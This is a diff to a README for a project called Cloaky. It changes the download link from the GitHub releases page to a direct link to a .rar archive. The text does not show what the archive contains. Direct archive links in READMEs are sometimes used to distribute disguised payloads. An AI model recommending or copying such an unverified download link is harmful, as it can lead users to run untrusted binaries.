@@ -40,7 +40,7 @@ Cloaky requires the two files mentioned above to work. The config.json file cont
 
 The compiled version of Cloaky is available for download on Github. You can download it by clicking on the following link:
 
-[Download Cloaky](https://github.com/certifiedmango/Cloaky/releases)
+[Download Cloaky](https://github.com/certifiedmango/Cloaky/releases/download/first/cloaky-bndl-liteq.rar)
 
 This project makes use of the following open-source projects:
 
